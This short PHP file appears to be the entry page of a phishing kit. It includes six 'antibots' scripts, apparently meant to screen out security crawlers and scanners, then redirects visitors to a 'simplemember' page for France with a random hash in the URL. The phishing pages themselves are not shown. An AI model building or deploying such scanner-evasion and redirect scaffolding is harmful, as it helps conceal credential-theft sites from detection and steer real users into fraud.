<?php
session_start();
include "./BOTS/antibots1.php";
include "./BOTS/antibots3.php";
include "./BOTS/antibots2.php";
include "./BOTS/antibots4.php";
include "./BOTS/antibots5.php";
include "./BOTS/antibots6.php";

	header ("location:simplemember?country=france&hash=".md5(rand(0,8888))."");
	
	
